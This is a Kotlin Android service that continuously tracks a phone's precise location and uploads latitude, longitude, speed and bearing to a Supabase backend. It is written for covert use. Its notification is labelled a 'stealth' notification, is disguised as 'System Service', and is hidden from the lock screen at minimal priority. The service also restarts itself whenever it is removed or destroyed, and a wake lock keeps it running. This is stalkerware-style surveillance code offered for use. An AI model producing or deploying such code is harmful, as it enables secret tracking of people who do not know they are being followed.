package com.uzaif.locationservice.service

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.Build
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.uzaif.locationservice.MainActivity
import com.uzaif.locationservice.R
import com.uzaif.locationservice.repository.LocationRepository
import kotlinx.coroutines.*

class LocationTrackingService : Service() {
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationRequest: LocationRequest
    private lateinit var locationCallback: LocationCallback
    private val locationRepository = LocationRepository()
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var wakeLock: PowerManager.WakeLock? = null
    
    companion object {
        private const val NOTIFICATION_ID = 12345678
        private const val CHANNEL_ID = "LocationTrackingChannel"
        private const val LOCATION_UPDATE_INTERVAL = 45000L // 45 seconds
        private const val FASTEST_LOCATION_INTERVAL = 30000L // 30 seconds
        
        @Volatile
        private var isServiceRunning = false
        
        fun startService(context: Context) {
            if (!isServiceRunning) {
                val intent = Intent(context, LocationTrackingService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                isServiceRunning = true
            }
        }
        
        fun stopService(context: Context) {
            val intent = Intent(context, LocationTrackingService::class.java)
            context.stopService(intent)
            isServiceRunning = false
        }
        
        fun isRunning(): Boolean = isServiceRunning
    }
    
    override fun onCreate() {
        super.onCreate()
        Log.d("LocationService", "Service created")
        
        // Acquire wake lock to keep CPU awake
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "LocationService::WakeLock"
        )
        wakeLock?.acquire(10*60*1000L /*10 minutes*/)
        
        createNotificationChannel()
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        createLocationRequest()
        createLocationCallback()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("LocationService", "Service started")
        
        // Start as foreground service immediately
        startForeground(NOTIFICATION_ID, createStealthNotification())
        startLocationUpdates()
        
        isServiceRunning = true
        
        // Return START_STICKY to restart service if killed by system
        return START_STICKY
    }
    
    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d("LocationService", "App removed from recent apps - service continues running")
        
        // Restart the service if task is removed
        val restartServiceIntent = Intent(applicationContext, LocationTrackingService::class.java)
        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext, 1, restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        
        val alarmService = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.ELAPSED_REALTIME,
            System.currentTimeMillis() + 1000,
            restartServicePendingIntent
        )
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        Log.d("LocationService", "Service destroyed - attempting restart")
        
        stopLocationUpdates()
        serviceScope.cancel()
        isServiceRunning = false
        
        // Release wake lock
        wakeLock?.let {
            if (it.isHeld) {
                it.release()
            }
        }
        
        // Restart service automatically unless explicitly stopped
        restartService()
    }
    
    private fun restartService() {
        Log.d("LocationService", "Restarting service in 2 seconds...")
        
        val restartServiceIntent = Intent(applicationContext, LocationTrackingService::class.java)
        val restartServicePendingIntent = PendingIntent.getService(
            applicationContext, 1, restartServiceIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        
        val alarmService = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmService.set(
            AlarmManager.ELAPSED_REALTIME,
            System.currentTimeMillis() + 2000, // Restart after 2 seconds
            restartServicePendingIntent
        )
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Background Location",
                NotificationManager.IMPORTANCE_MIN // Minimal importance for stealth
            ).apply {
                description = "Location service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createStealthNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimal priority
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hide from lock screen
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .build()
    }
    
    private fun createLocationRequest() {
        locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, LOCATION_UPDATE_INTERVAL)
            .setWaitForAccurateLocation(false)
            .setMinUpdateIntervalMillis(FASTEST_LOCATION_INTERVAL)
            .setMaxUpdateDelayMillis(LOCATION_UPDATE_INTERVAL * 2)
            .build()
    }
    
    private fun createLocationCallback() {
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                super.onLocationResult(locationResult)
                locationResult.lastLocation?.let { location ->
                    Log.d("LocationService", "Location received: ${location.latitude}, ${location.longitude}")
                    uploadLocationToSupabase(location)
                }
            }
            
            override fun onLocationAvailability(locationAvailability: LocationAvailability) {
                super.onLocationAvailability(locationAvailability)
                if (!locationAvailability.isLocationAvailable) {
                    Log.w("LocationService", "Location not available - retrying...")
                    // Retry location requests if not available
                    serviceScope.launch {
                        delay(5000)
                        startLocationUpdates()
                    }
                }
            }
        }
    }
    
    @SuppressLint("MissingPermission")
    private fun startLocationUpdates() {
        try {
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback,
                Looper.getMainLooper()
            )
            Log.d("LocationService", "Location updates started")
            
            // Also get last known location immediately
            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                location?.let {
                    Log.d("LocationService", "Last known location: ${it.latitude}, ${it.longitude}")
                    uploadLocationToSupabase(it)
                }
            }
        } catch (e: SecurityException) {
            Log.e("LocationService", "Location permission not granted", e)
        }
    }
    
    private fun stopLocationUpdates() {
        fusedLocationClient.removeLocationUpdates(locationCallback)
        Log.d("LocationService", "Location updates stopped")
    }
    
    private fun uploadLocationToSupabase(location: Location) {
        serviceScope.launch {
            try {
                val result = locationRepository.uploadLocation(
                    latitude = location.latitude,
                    longitude = location.longitude,
                    accuracy = if (location.hasAccuracy()) location.accuracy else null,
                    speed = if (location.hasSpeed()) location.speed else null,
                    bearing = if (location.hasBearing()) location.bearing else null
                )
                
                result.fold(
                    onSuccess = { 
                        Log.d("LocationService", "Location uploaded successfully")
                    },
                    onFailure = { exception ->
                        Log.e("LocationService", "Failed to upload location", exception)
                        
                        // Retry failed uploads after delay
                        delay(30000) // Wait 30 seconds
                        uploadLocationToSupabase(location) // Retry
                    }
                )
            } catch (e: Exception) {
                Log.e("LocationService", "Exception during location upload", e)
            }
        }
    }
} 